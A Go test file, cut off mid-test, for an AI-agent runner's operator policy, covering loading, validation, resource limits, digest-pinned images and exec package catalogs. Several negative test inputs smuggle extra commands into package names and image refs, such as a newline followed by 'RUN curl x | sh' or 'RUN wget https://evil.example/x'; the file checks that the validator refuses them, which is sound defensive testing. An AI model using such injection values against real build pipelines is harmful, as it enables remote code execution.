// Policy tests: the generated default file must parse back to exactly
// Default() (what first use writes is what runs), and the validator must
// name its refusals.
package policy

import (
	"os"
	"path/filepath"
	"reflect"
	"regexp"
	"slices"
	"strings"
	"testing"

	"github.com/blaktron/agentry-cli/pkg/runner/receipt"
	"github.com/blaktron/agentry-cli/runnerimage/websearch"
)

func TestDefaultFileMatchesDefault(t *testing.T) {
	path := filepath.Join(t.TempDir(), "policy.yaml")
	pol, sha, err := EnsureDefault(path)
	if err != nil {
		t.Fatalf("EnsureDefault: %v", err)
	}
	if sha == "" {
		t.Fatal("no policy hash returned")
	}
	if !reflect.DeepEqual(pol, Default()) {
		t.Fatalf("generated default file parses to %+v, want Default() %+v", pol, Default())
	}
	// Second load reuses the file without rewriting it.
	before, _ := os.ReadFile(path)
	if _, _, err := EnsureDefault(path); err != nil {
		t.Fatalf("reload: %v", err)
	}
	after, _ := os.ReadFile(path)
	if string(before) != string(after) {
		t.Fatal("EnsureDefault rewrote an existing policy file")
	}
}

func TestLoadRejectsUnknownKeys(t *testing.T) {
	path := filepath.Join(t.TempDir(), "policy.yaml")
	bad := strings.Replace(defaultFileText, "allowWildcardEgress: false",
		"allowWildcardEgres: true", 1) // typo must not silently disable the gate
	if err := os.WriteFile(path, []byte(bad), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, _, err := Load(path); err == nil {
		t.Fatal("typo'd policy key accepted")
	}
}

func TestValidateTable(t *testing.T) {
	tests := []struct {
		name    string
		mutate  func(*Policy)
		wantErr string
	}{
		{"missing api key env", func(p *Policy) { p.Model.APIKeyEnv = "" }, "apiKeyEnv"},
		{"empty proxy allow", func(p *Policy) { p.Model.ProxyAllow = nil }, "proxyAllow"},
		{"bad proxy entry", func(p *Policy) { p.Model.ProxyAllow = []string{"http://x"} }, "proxyAllow"},
		{"bad secret mode", func(p *Policy) { p.SecretSource.Mode = "vault" }, "secretSource.mode"},
		{"envFile without path", func(p *Policy) { p.SecretSource = SecretSource{Mode: "envFile"} }, "envFile"},
		{"env with stray path", func(p *Policy) { p.SecretSource = SecretSource{Mode: "env", EnvFile: "x"} }, "envFile"},
		{"docker runtime with a space", func(p *Policy) { p.Docker.Runtime = "run sc" }, "docker.runtime"},
		{"docker runtime that is a path", func(p *Policy) { p.Docker.Runtime = "/usr/bin/runsc" }, "docker.runtime"},
		{"memory without a unit", func(p *Policy) { p.Docker.Limits.Memory = "2048" }, "docker.limits.memory"},
		{"memory in bytes", func(p *Policy) { p.Docker.Limits.Memory = "2b" }, "docker.limits.memory"},
		{"memory under docker's floor", func(p *Policy) { p.Docker.Limits.Memory = "5m" }, "docker.limits.memory"},
		{"negative cpus", func(p *Policy) { p.Docker.Limits.CPUs = -1 }, "docker.limits.cpus"},
		{"too few pids to start", func(p *Policy) { p.Docker.Limits.Pids = 8 }, "docker.limits.pids"},
		{"zero timeout", func(p *Policy) { p.Budgets.TimeoutSeconds = 0 }, "timeoutSeconds"},
		{"negative turns", func(p *Policy) { p.Budgets.MaxTurns = -1 }, "maxTurns"},
		{"missing image", func(p *Policy) { p.Images.Gateway = "" }, "images"},
		{"wrong version", func(p *Policy) { p.PolicyVersion = "2" }, "policyVersion"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			p := Default()
			tc.mutate(p)
			err := p.Validate()
			if err == nil || !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("Validate() = %v, want mention of %q", err, tc.wantErr)
			}
		})
	}
}

func TestSaveRoundTrip(t *testing.T) {
	path := filepath.Join(t.TempDir(), "deep", "policy.yaml") // Save must create the directory
	p := Default()
	p.Model.Provider, p.Model.Name = "openai", "gpt-5.2"
	p.DataAccessServers = map[string][]string{"tickets": {"/etc/agentry/jira.yaml"}}
	p.Profiles.KeepByDefault = boolPtr(false)
	if err := Save(path, p); err != nil {
		t.Fatalf("Save: %v", err)
	}

	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(string(raw), "# Agentry Runner operator policy") ||
		!strings.Contains(string(raw), "comments are not preserved") {
		t.Errorf("generated header missing:\n%s", raw)
	}

	got, sha, err := Load(path)
	if err != nil {
		t.Fatalf("Load after Save: %v", err)
	}
	if sha == "" {
		t.Error("Load returned no policy hash")
	}
	if !reflect.DeepEqual(got, p) {
		t.Fatalf("round-trip mismatch:\ngot  %+v\nwant %+v", got, p)
	}
	// The Profiles pointer must survive as an explicit false, not revert to
	// the unset-means-true default.
	if got.Profiles.KeepByDefault == nil || *got.Profiles.KeepByDefault {
		t.Error("keepByDefault: false did not round-trip")
	}
}

func TestSaveRefusesInvalidPolicy(t *testing.T) {
	path := filepath.Join(t.TempDir(), "policy.yaml")
	p := Default()
	p.Model.APIKeyEnv = ""
	if err := Save(path, p); err == nil || !strings.Contains(err.Error(), "apiKeyEnv") {
		t.Fatalf("Save of an invalid policy: err = %v", err)
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Error("invalid policy was still written to disk")
	}
}

func TestSaveCreateDirError(t *testing.T) {
	blocker := filepath.Join(t.TempDir(), "file")
	if err := os.WriteFile(blocker, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	err := Save(filepath.Join(blocker, "sub", "policy.yaml"), Default())
	if err == nil || !strings.Contains(err.Error(), "create policy dir") {
		t.Fatalf("err = %v", err)
	}
}

func TestDefaultPath(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	got, err := DefaultPath()
	if err != nil {
		t.Fatal(err)
	}
	if want := filepath.Join(home, ".agentry", "runner", "policy.yaml"); got != want {
		t.Errorf("DefaultPath = %q, want %q", got, want)
	}

	t.Setenv("HOME", "")
	if _, err := DefaultPath(); err == nil {
		t.Fatal("DefaultPath with no HOME must error")
	}
}

func TestKeepProfilesByDefault(t *testing.T) {
	p := &Policy{}
	if !p.KeepProfilesByDefault() {
		t.Error("unset keepByDefault must read as true")
	}
	p.Profiles.KeepByDefault = boolPtr(true)
	if !p.KeepProfilesByDefault() {
		t.Error("explicit true read as false")
	}
	p.Profiles.KeepByDefault = boolPtr(false)
	if p.KeepProfilesByDefault() {
		t.Error("explicit false read as true")
	}
}

func TestLoadMissingFile(t *testing.T) {
	_, _, err := Load(filepath.Join(t.TempDir(), "absent.yaml"))
	if err == nil || !os.IsNotExist(err) {
		t.Fatalf("err = %v, want the raw not-exist error for callers to branch on", err)
	}
}

func TestLoadRefusesTrailingDocument(t *testing.T) {
	path := filepath.Join(t.TempDir(), "policy.yaml")
	two := defaultFileText + "\n---\nallowWildcardEgress: true\n"
	if err := os.WriteFile(path, []byte(two), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, _, err := Load(path); err == nil || !strings.Contains(err.Error(), "trailing YAML document") {
		t.Fatalf("err = %v", err)
	}
}

func TestEnsureDefaultUnwritableDir(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("running as root: directory permissions do not refuse writes")
	}
	// The policy path's directory does not exist yet and cannot be created:
	// stat reports not-exist, MkdirAll is refused.
	parent := t.TempDir()
	if err := os.Chmod(parent, 0o555); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(parent, 0o755) })
	_, _, err := EnsureDefault(filepath.Join(parent, "runner", "policy.yaml"))
	if err == nil || !strings.Contains(err.Error(), "create policy dir") {
		t.Fatalf("err = %v", err)
	}
}

func TestEnsureDefaultWriteError(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("running as root: directory permissions do not refuse writes")
	}
	dir := t.TempDir()
	if err := os.Chmod(dir, 0o555); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(dir, 0o755) })
	_, _, err := EnsureDefault(filepath.Join(dir, "policy.yaml"))
	if err == nil || !strings.Contains(err.Error(), "write default policy") {
		t.Fatalf("err = %v", err)
	}
}

func TestRunnerImageTag(t *testing.T) {
	p := Default()
	if got := p.RunnerImageTag("1.2.3"); got != "agentry-runner:1.2.3" {
		t.Errorf("tag = %q", got)
	}
	if got := p.RunnerImageTag("1.2.3+dirty!"); got != "agentry-runner:dev" {
		t.Errorf("unsafe version should fall back to dev, got %q", got)
	}
	if got := p.RunnerImageTag(""); got != "agentry-runner:dev" {
		t.Errorf("empty version should fall back to dev, got %q", got)
	}
	p.Images.Runner = "custom:tag"
	if got := p.RunnerImageTag("1.2.3"); got != "custom:tag" {
		t.Errorf("override ignored, got %q", got)
	}
}

// TestSessionsDefaultsAndValidation: the interactive caps ship with
// defaults, round-trip through Save/Load, and refuse negatives.
func TestSessionsDefaultsAndValidation(t *testing.T) {
	p := Default()
	if p.Sessions != (Sessions{IdleTimeoutSeconds: 900, MaxWallSeconds: 7200, MaxUserTurns: 200}) {
		t.Fatalf("defaults = %+v", p.Sessions)
	}
	path := filepath.Join(t.TempDir(), "policy.yaml")
	if err := Save(path, p); err != nil {
		t.Fatal(err)
	}
	loaded, _, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if loaded.Sessions != p.Sessions {
		t.Errorf("round trip = %+v", loaded.Sessions)
	}
	p.Sessions.MaxUserTurns = -1
	if err := p.Validate(); err == nil || !strings.Contains(err.Error(), "sessions.") {
		t.Errorf("negative cap accepted: %v", err)
	}
}

// TestExecCatalog: `exec.packages` maps a command name to the apk package that
// provides it, optionally pinned; `exec.apkMirror` is an http(s) URL or empty;
// a bad command name, package or mirror is refused; the default policy carries
// no entries (the operator opts in per tool) but documents the key.
func TestExecCatalog(t *testing.T) {
	p := Default()
	if len(p.Exec.Packages) != 0 || p.Exec.APKMirror != "" {
		t.Fatalf("default policy ships exec entries: %+v", p.Exec)
	}
	p.Exec.Packages = map[string]string{"git": "git", "openssl": "openssl=3.5.1-r0", "jq": "jq"}
	p.Exec.APKMirror = "https://mirror.example/alpine"
	if err := p.Validate(); err != nil {
		t.Fatalf("valid catalog refused: %v", err)
	}
	if got := p.Exec.Package("openssl"); got != "openssl=3.5.1-r0" {
		t.Fatalf("Package(openssl) = %q", got)
	}
	if got := p.Exec.Package("curl"); got != "" {
		t.Fatalf("Package(curl) = %q, want empty for an uncatalogued command", got)
	}
	for name, mutate := range map[string]func(*Policy){
		"command with a slash":     func(p *Policy) { p.Exec.Packages = map[string]string{"bin/git": "git"} },
		"empty package":            func(p *Policy) { p.Exec.Packages = map[string]string{"git": ""} },
		"package with a space":     func(p *Policy) { p.Exec.Packages = map[string]string{"git": "git openssl"} },
		"package as a path":        func(p *Policy) { p.Exec.Packages = map[string]string{"git": "../git"} },
		"package with a newline":   func(p *Policy) { p.Exec.Packages = map[string]string{"git": "git\nRUN curl x | sh"} },
		"package with a semicolon": func(p *Policy) { p.Exec.Packages = map[string]string{"jq": "jq; curl x"} },
		"command with a quote":     func(p *Policy) { p.Exec.Packages = map[string]string{"g'it": "git"} },
		"mirror not a URL":         func(p *Policy) { p.Exec.APKMirror = "mirror.example" },
		"mirror with a fragment":   func(p *Policy) { p.Exec.APKMirror = "https://m.example/alpine#x" },
	} {
		t.Run(name, func(t *testing.T) {
			p := Default()
			mutate(p)
			if err := p.Validate(); err == nil || !strings.Contains(err.Error(), "exec.") {
				t.Fatalf("Validate() = %v, want an exec.* refusal", err)
			}
		})
	}
	// The default file documents the key as comments and round-trips.
	raw := []byte(defaultFileText)
	for _, want := range []string{"exec:", "packages:", "git", "apkMirror"} {
		if !strings.Contains(string(raw), want) {
			t.Errorf("default policy text does not document %q", want)
		}
	}
}

// docker.runtime is a closed-schema key: a set value loads, is
// absent from the default, and a misspelling under docker is an error like
// every other unknown key.
func TestDockerRuntimeKey(t *testing.T) {
	if Default().Docker.Runtime != "" {
		t.Fatal("the default policy names a runtime; every run before the knob had the daemon's default")
	}
	path := filepath.Join(t.TempDir(), "policy.yaml")
	if err := os.WriteFile(path, []byte(defaultFileText+"\ndocker:\n  runtime: runsc\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	p, _, err := Load(path)
	if err != nil {
		t.Fatalf("a policy with docker.runtime was refused: %v", err)
	}
	if p.Docker.Runtime != "runsc" {
		t.Fatalf("docker.runtime = %q, want runsc", p.Docker.Runtime)
	}
	if err := os.WriteFile(path, []byte(defaultFileText+"\ndocker:\n  runtim: runsc\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, _, err := Load(path); err == nil {
		t.Fatal("a misspelled docker key was accepted")
	}
	if !strings.Contains(defaultFileText, "runtime: runsc") {
		t.Fatal("the generated default policy file does not explain docker.runtime")
	}
}

// TestDefaultPathFollowsTheRunnerHome: with the runner home relocated, the
// policy relocates with it; without, it is under the user's home.
func TestDefaultPathFollowsTheRunnerHome(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	t.Setenv(HomeEnv, "")
	p, err := DefaultPath()
	if err != nil || p != filepath.Join(os.Getenv("HOME"), ".agentry", "runner", "policy.yaml") {
		t.Fatalf("unset: %q %v", p, err)
	}
	dir := t.TempDir()
	t.Setenv(HomeEnv, dir)
	p, err = DefaultPath()
	if err != nil || p != filepath.Join(dir, "policy.yaml") {
		t.Fatalf("set: %q %v", p, err)
	}
	h, err := Home()
	if err != nil || h != dir {
		t.Fatalf("Home: %q %v", h, err)
	}
}

// TestAPIKeySource: the keyring source parses on the model and the harness
// blocks; anything else is refused by name.
func TestAPIKeySource(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "policy.yaml")
	pol := Default()
	pol.Model.APIKeySource = "keyring"
	pol.Harness = map[string]HarnessPolicy{"claude": {APIKeySource: "env"}}
	if err := Save(p, pol); err != nil {
		t.Fatal(err)
	}
	raw, _ := os.ReadFile(p)
	if !strings.Contains(string(raw), "apiKeySource: keyring") {
		t.Fatalf("not written:\n%s", raw)
	}
	got, _, err := Load(p)
	if err != nil || got.Model.APIKeySource != "keyring" || got.Harness["claude"].APIKeySource != "env" {
		t.Fatalf("load: %+v %v", got, err)
	}
	pol.Model.APIKeySource = "vault"
	if err := pol.Validate(); err == nil || !strings.Contains(err.Error(), "model.apiKeySource") {
		t.Fatalf("vault accepted: %v", err)
	}
	pol.Model.APIKeySource = ""
	pol.Harness["claude"] = HarnessPolicy{APIKeySource: "file"}
	if err := pol.Validate(); err == nil || !strings.Contains(err.Error(), "harness.claude.apiKeySource") {
		t.Fatalf("file accepted: %v", err)
	}
}

// apiKeyKind: what the Anthropic credential is — an API
// key (the default, unwritten) or a subscription OAuth token, which only
// Claude Code may use. Round-trips, validates, and the one rule reads the
// harness block first like apiKeyEnv and apiKeySource.
func TestAPIKeyKindRoundTripsValidatesAndFollowsTheOneRule(t *testing.T) {
	p := filepath.Join(t.TempDir(), "policy.yaml")
	pol := Default()
	pol.Model.APIKeyKind = "subscription"
	pol.Harness = map[string]HarnessPolicy{"claude": {APIKeyKind: "api"}}
	if err := Save(p, pol); err != nil {
		t.Fatal(err)
	}
	raw, _ := os.ReadFile(p)
	if !strings.Contains(string(raw), "apiKeyKind: subscription") {
		t.Fatalf("not written:\n%s", raw)
	}
	got, _, err := Load(p)
	if err != nil || got.Model.APIKeyKind != "subscription" || got.Harness["claude"].APIKeyKind != "api" {
		t.Fatalf("load: %+v %v", got, err)
	}
	if k := KeyKind(got.Harness["claude"], got.Model); k != "api" {
		t.Fatalf("the harness block's kind wins: %q", k)
	}
	if k := KeyKind(HarnessPolicy{}, got.Model); k != "subscription" {
		t.Fatalf("else the model's: %q", k)
	}
	if k := KeyKind(HarnessPolicy{}, Model{}); k != "api" {
		t.Fatalf("unset is api: %q", k)
	}
	pol.Model.APIKeyKind = "oauth"
	if err := pol.Validate(); err == nil || !strings.Contains(err.Error(), "model.apiKeyKind") {
		t.Fatalf("oauth accepted: %v", err)
	}
	pol.Model.APIKeyKind = ""
	pol.Harness["claude"] = HarnessPolicy{APIKeyKind: "token"}
	if err := pol.Validate(); err == nil || !strings.Contains(err.Error(), "harness.claude.apiKeyKind") {
		t.Fatalf("token accepted: %v", err)
	}
}

func TestCredentialKindOfReadsTheAnthropicShapesAndNothingElse(t *testing.T) {
	cases := []struct {
		provider, key string
		want          string
	}{
		{"anthropic", "sk-ant-api03-abc", KeyKindAPI},
		{"anthropic", "sk-ant-oat01-abc", KeyKindSubscription},
		{"Anthropic", "  sk-ant-oat01-abc  ", KeyKindSubscription},
		{"anthropic", "sk-ant-admin01-abc", KeyKindAPI}, // a shape this build does not know: the endpoint judges
		{"anthropic", "", KeyKindAPI},
		{"openai", "sk-proj-abc", KeyKindAPI},
		{"openai", "sk-ant-oat01-abc", KeyKindAPI}, // another provider's key is what it is
		{"custom", "anything", KeyKindAPI},
	}
	for _, c := range cases {
		if got := CredentialKindOf(c.provider, c.key); got != c.want {
			t.Errorf("CredentialKindOf(%q, %q) = %q, want %q", c.provider, c.key, got, c.want)
		}
	}
	// A subscription kind is valid only where it can be honoured.
	pol := Default()
	pol.Model.Provider, pol.Model.APIKeyKind = "openai", KeyKindSubscription
	pol.Model.APIKeyEnv = "OPENAI_API_KEY"
	if err := pol.Validate(); err == nil || !strings.Contains(err.Error(), "needs model.provider anthropic") {
		t.Fatalf("subscription on openai: %v", err)
	}
	pol = Default()
	pol.Harness = map[string]HarnessPolicy{"codex": {APIKeyKind: KeyKindSubscription}}
	if err := pol.Validate(); err == nil || !strings.Contains(err.Error(), "harness.codex.apiKeyKind subscription") {
		t.Fatalf("subscription on the codex harness: %v", err)
	}
	pol.Harness = map[string]HarnessPolicy{"claude": {APIKeyKind: KeyKindSubscription}}
	if err := pol.Validate(); err != nil {
		t.Fatalf("subscription on the claude harness beside an API key for the container: %v", err)
	}
}

// A policy that sets no limits is bounded by the defaults, and a set field
// keeps its value.
func TestLimitsDefaults(t *testing.T) {
	if got := (Limits{}).WithDefaults(); got != (Limits{Memory: DefaultMemory, CPUs: DefaultCPUs, Pids: DefaultPids}) {
		t.Fatalf("zero limits with defaults = %+v", got)
	}
	if got := (Limits{Memory: "512m", Pids: 64}).WithDefaults(); got != (Limits{Memory: "512m", CPUs: DefaultCPUs, Pids: 64}) {
		t.Fatalf("partial limits with defaults = %+v", got)
	}
	p := Default()
	p.Docker.Limits = Limits{Memory: "4g", CPUs: 4, Pids: 1024}
	if err := p.Validate(); err != nil {
		t.Fatalf("valid limits refused: %v", err)
	}
}

// TestRunnerImageBasesArePinnedByDigest: both bases of the runner image are
// name:tag@sha256:<64 hex>, so the bytes a build starts from cannot move under
// a tag. The Dockerfile's GO_IMAGE default and the policy's goBuilder default
// are the same ref (the CLI always passes the policy's as the build argument,
// so a Dockerfile-only pin would pin nothing), and the generated policy file
// carries it.
func TestRunnerImageBasesArePinnedByDigest(t *testing.T) {
	digestRef := regexp.MustCompile(`^ghcr\.io/blaktron/[a-z0-9-]+:[A-Za-z0-9._-]+@sha256:[0-9a-f]{64}$`)
	df, err := os.ReadFile(filepath.Join("..", "..", "..", "runnerimage", "Dockerfile"))
	if err != nil {
		t.Fatal(err)
	}
	args := map[string]string{}
	for _, line := range strings.Split(string(df), "\n") {
		if name, val, ok := strings.Cut(strings.TrimPrefix(line, "ARG "), "="); ok && strings.HasPrefix(line, "ARG ") {
			args[name] = val
		}
	}
	for _, name := range []string{"GO_IMAGE", "RUNTIME_IMAGE", "TYPST_IMAGE"} {
		if !digestRef.MatchString(args[name]) {
			t.Errorf("Dockerfile ARG %s = %q, want name:tag@sha256:<digest>", name, args[name])
		}
	}
	if !digestRef.MatchString(DefaultGoBuilder) {
		t.Errorf("DefaultGoBuilder = %q, want name:tag@sha256:<digest>", DefaultGoBuilder)
	}
	if args["GO_IMAGE"] != DefaultGoBuilder {
		t.Errorf("Dockerfile GO_IMAGE %q differs from the policy default %q", args["GO_IMAGE"], DefaultGoBuilder)
	}
	if !strings.Contains(defaultFileText, "goBuilder: "+DefaultGoBuilder+"\n") {
		t.Error("the generated policy file does not carry the digest-pinned goBuilder")
	}
}

// Resolve says which policy file a run reads and how it was chosen, for the
// receipt: --policy wins, then a home relocated by AGENTRY_RUNNER_HOME, then
// the default home; each path absolute.
func TestResolveNamesThePathAndHowItWasChosen(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv(HomeEnv, "")
	f, err := Resolve("")
	if err != nil || f.Path != filepath.Join(home, ".agentry", "runner", "policy.yaml") || f.Source != receipt.PolicySourceDefault {
		t.Fatalf("default: %+v %v", f, err)
	}
	relocated := t.TempDir()
	t.Setenv(HomeEnv, relocated)
	f, err = Resolve("")
	if err != nil || f.Path != filepath.Join(relocated, "policy.yaml") || f.Source != receipt.PolicySourceEnv {
		t.Fatalf("env: %+v %v", f, err)
	}
	// The flag wins over a relocated home; a relative flag or home is
	// made absolute so the record names one file.
	t.Chdir(t.TempDir())
	cwd, _ := os.Getwd()
	f, err = Resolve("ops/policy.yaml")
	if err != nil || f.Path != filepath.Join(cwd, "ops", "policy.yaml") || f.Source != receipt.PolicySourceFlag {
		t.Fatalf("flag: %+v %v", f, err)
	}
	t.Setenv(HomeEnv, "rel-home")
	f, err = Resolve("")
	if err != nil || f.Path != filepath.Join(cwd, "rel-home", "policy.yaml") || f.Source != receipt.PolicySourceEnv {
		t.Fatalf("relative env: %+v %v", f, err)
	}
}

// TestWebSearchNamesAProviderTheImageBuilds: webSearch.provider admits none
// and exactly the providers the runner image's copy of the core's
// pkg/websearch builds, so a name the policy passes is one the tools server
// can search with. Each reads its own variable by default,
// so a You.com key never serves Brave, and the block round-trips.
func TestWebSearchNamesAProviderTheImageBuilds(t *testing.T) {
	var image []string
	for _, name := range websearch.Providers() {
		if name != "none" {
			image = append(image, name)
		}
	}
	slices.Sort(image)
	if got := WebSearchProviders(); !slices.Equal(got, image) {
		t.Fatalf("the policy admits %v, the image builds %v", got, image)
	}
	for _, name := range append([]string{"", "none"}, image...) {
		pol := Default()
		pol.WebSearch.Provider = name
		if err := pol.Validate(); err != nil {
			t.Fatalf("%q refused: %v", name, err)
		}
		if !pol.WebSearch.On() {
			continue
		}
		if p, err := websearch.New(name, "", "a-key"); err != nil || p == nil {
			t.Fatalf("the image does not build %q: %v", name, err)
		}
	}
	pol := Default()
	pol.WebSearch.Provider = "bing"
	if err := pol.Validate(); err == nil || !strings.Contains(err.Error(), `webSearch.provider "bing" must be none, brave, exa, perplexity, tavily or youcom`) {
		t.Fatalf("bing accepted: %v", err)
	}

	for _, c := range []struct {
		key       WebSearchKey
		env, name string
	}{
		{WebSearchKey{Provider: "youcom"}, "YDC_API_KEY", "You.com"},
		{WebSearchKey{Provider: "brave"}, "BRAVE_API_KEY", "Brave"},
		{WebSearchKey{Provider: "brave", APIKeyEnv: "MY_SEARCH_KEY"}, "MY_SEARCH_KEY", "Brave"},
		{WebSearchKey{Provider: "tavily"}, "TAVILY_API_KEY", "Tavily"},
		{WebSearchKey{Provider: "exa"}, "EXA_API_KEY", "Exa"},
		{WebSearchKey{Provider: "perplexity"}, "PERPLEXITY_API_KEY", "Perplexity"},
	} {
		if got := c.key.KeyEnv(); got != c.env {
			t.Fatalf("%+v reads $%s, want $%s", c.key, got, c.env)
		}
		if got := c.key.ProviderName(); got != c.name {
			t.Fatalf("%+v is called %q, want %q", c.key, got, c.name)
		}
	}

	p := filepath.Join(t.TempDir(), "policy.yaml")
	pol = Default()
	pol.WebSearch = WebSearchKey{Provider: "brave", APIKeySource: "keyring"}
	if err := Save(p, pol); err != nil {
		t.Fatal(err)
	}
	got, _, err := Load(p)
	if err != nil || got.WebSearch != pol.WebSearch {
		t.Fatalf("load: %+v %v", got.WebSearch, err)
	}
}

// TestDockerResolvers: docker.resolvers takes at most three name servers by
// address, each one a container can reach: a loopback stub such as
// systemd-resolved's is the container's own inside it, and is refused with the
// reason. The gateway's runtime is a runtime name, and only beside the run's
// own: the gateway is never sandboxed while the QuickAgent's code is not.
func TestDockerGatewayRuntime(t *testing.T) {
	p := Default()
	p.Docker.Runtime, p.Docker.GatewayRuntime = "runsc", "runsc-uds"
	if err := p.Validate(); err != nil {
		t.Errorf("runsc with runsc-uds refused: %v", err)
	}
	p.Docker.GatewayRuntime = "runsc uds"
	if err := p.Validate(); err == nil || !strings.Contains(err.Error(), "docker.gatewayRuntime") {
		t.Errorf("a bad name: %v", err)
	}
	p.Docker.Runtime, p.Docker.GatewayRuntime = "", "runsc-uds"
	if err := p.Validate(); err == nil || !strings.Contains(err.Error(), "needs docker.runtime") {
		t.Errorf("a gateway runtime alone: %v", err)
	}
}

func TestDockerResolvers(t *testing.T) {
	for _, ok := range [][]string{nil, {"192.168.122.1"}, {"108.61.10.10"}, {"1.1.1.1", "9.9.9.9", "8.8.8.8"}} {
		p := Default()
		p.Docker.Resolvers = ok
		if err := p.Validate(); err != nil {
			t.Errorf("%v refused: %v", ok, err)
		}
	}
	for name, bad := range map[string][]string{
		"a host name":   {"dns.example.com"},
		"a port":        {"192.168.122.1:53"},
		"loopback":      {"127.0.0.53"},
		"IPv6 loopback": {"::1"},
		"unspecified":   {"0.0.0.0"},
		"multicast":     {"224.0.0.251"},
		"a zone":        {"fe80::1%eth0"},
		"twice":         {"9.9.9.9", "9.9.9.9"},
		"IPv6":          {"2001:19f0:300:1704::6"},
		"IPv4 in IPv6":  {"::ffff:9.9.9.9"},
		"four":          {"1.1.1.1", "9.9.9.9", "8.8.8.8", "8.8.4.4"},
	} {
		p := Default()
		p.Docker.Resolvers = bad
		err := p.Validate()
		if err == nil || !strings.Contains(err.Error(), "docker.resolvers") {
			t.Errorf("%s (%v): %v, want a refusal naming docker.resolvers", name, bad, err)
		}
		if name == "loopback" && !strings.Contains(err.Error(), "loopback stub") {
			t.Errorf("the loopback refusal does not say why: %v", err)
		}
	}
}

// images.unsafe names the Unsafe Mode base and turns nothing on: the default is
// pinned by digest and resolved at use, so the generated policy file never
// carries it, and a policy that sets it only changes which image a client's
// Unsafe Mode builds on.
func TestTheUnsafeImageIsAPinnedDefaultAndSwitchesNothingOn(t *testing.T) {
	if !strings.Contains(DefaultUnsafeImage, "@sha256:") {
		t.Fatalf("DefaultUnsafeImage %q is not pinned by digest", DefaultUnsafeImage)
	}
	p := Default()
	if p.Images.Unsafe != "" {
		t.Fatalf("Default() writes images.unsafe = %q; it is resolved at use", p.Images.Unsafe)
	}
	if p.Images.UnsafeImage() != DefaultUnsafeImage {
		t.Fatalf("UnsafeImage() = %q", p.Images.UnsafeImage())
	}
	p.Images.Unsafe = "registry.example/kali@sha256:" + strings.Repeat("0", 64)
	if p.Images.UnsafeImage() != p.Images.Unsafe {
		t.Fatal("an operator's images.unsafe was not used")
	}
	// No key anywhere in the schema names Unsafe Mode as a switch.
	for _, key := range []string{"unsafeMode", "unsafe_mode", "enableUnsafe", "allowUnsafe"} {
		path := filepath.Join(t.TempDir(), "policy.yaml")
		if err := os.WriteFile(path, []byte("policyVersion: \"1\"\n"+key+": true\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if _, _, err := Load(path); err == nil || !strings.Contains(err.Error(), key) {
			t.Errorf("the policy accepted %q (err %v)", key, err)
		}
	}
}

// images.files names the files image the decode step builds on: the default is
// pinned by digest and resolved at use, and an operator's value must be pinned
// by digest too, because the image is pulled by digest only.
func TestTheFilesImageIsPinnedByDigest(t *testing.T) {
	if !PinnedByDigest(DefaultFilesImage) {
		t.Fatalf("DefaultFilesImage %q is not pinned by digest", DefaultFilesImage)
	}
	p := Default()
	if p.Images.Files != "" {
		t.Fatalf("Default() writes images.files = %q; it is resolved at use", p.Images.Files)
	}
	if p.Images.FilesImage() != DefaultFilesImage {
		t.Fatalf("FilesImage() = %q", p.Images.FilesImage())
	}
	p.Images.Files = "registry.example/files:1@sha256:" + strings.Repeat("a", 64)
	if err := p.Validate(); err != nil {
		t.Fatalf("a digest-pinned images.files was refused: %v", err)
	}
	if p.Images.FilesImage() != p.Images.Files {
		t.Fatal("an operator's images.files was not used")
	}
	for _, ref := range []string{
		"registry.example/files:1",
		"registry.example/files@sha256:" + strings.Repeat("a", 63),
		"registry.example/files@sha256:" + strings.Repeat("A", 64),
		"registry.example/files@sha256:" + strings.Repeat("a", 64) + "@sha256:" + strings.Repeat("b", 64),
		"@sha256:" + strings.Repeat("a", 64),
		"registry.example/my files@sha256:" + strings.Repeat("a", 64),
		"x\nRUN wget https://evil.example/x\nFROM a@sha256:" + strings.Repeat("a", 64),
		"Registry.Example/files@sha256:" + strings.Repeat("a", 64),
	} {
		p.Images.Files = ref
		if err := p.Validate(); err == nil || !strings.Contains(err.Error(), "images.files") {
			t.Errorf("images.files %q was accepted (err %v)", ref, err)
		}
	}
}

// TestBaseExecCommands: every machine provides the base commands as busybox
// without a catalog entry, the operator's entry still wins, and nothing on the
// list runs other programs.
func TestBaseExecCommands(t *testing.T) {
	var none ExecPolicy
	for _, c := range []string{"tar", "unzip", "gunzip", "grep", "sha256sum", "cat"} {
		if got := none.Package(c); got != "busybox" {
			t.Errorf("Package(%q) with no catalog = %q, want busybox", c, got)
		}
	}
	for _, c := range []string{"sh", "ash", "awk", "sed", "find", "xargs", "env", "curl", "wget", "git"} {
		if got := none.Package(c); got != "" {
			t.Errorf("Package(%q) with no catalog = %q, want not provided", c, got)
		}
		if slices.Contains(BaseExecCommands(), c) {
			t.Errorf("%q is a base command", c)
		}
	}
	own := ExecPolicy{Packages: map[string]string{"tar": "tar"}}
	if got := own.Package("tar"); got != "tar" {
		t.Errorf("operator's tar entry = %q, want tar", got)
	}
	if b := BaseExecCommands(); !slices.IsSorted(b) || len(slices.Compact(slices.Clone(b))) != len(b) {
		t.Errorf("BaseExecCommands = %v, want sorted and each once", b)
	}
}

// A policy file written by an earlier CLI names that day's default
// nodeRuntime explicitly; it loads as today's default, while any other
// value is the operator's and is kept.
func TestLoadMovesAFormerDefaultNodeRuntime(t *testing.T) {
	for _, c := range []struct{ written, want string }{
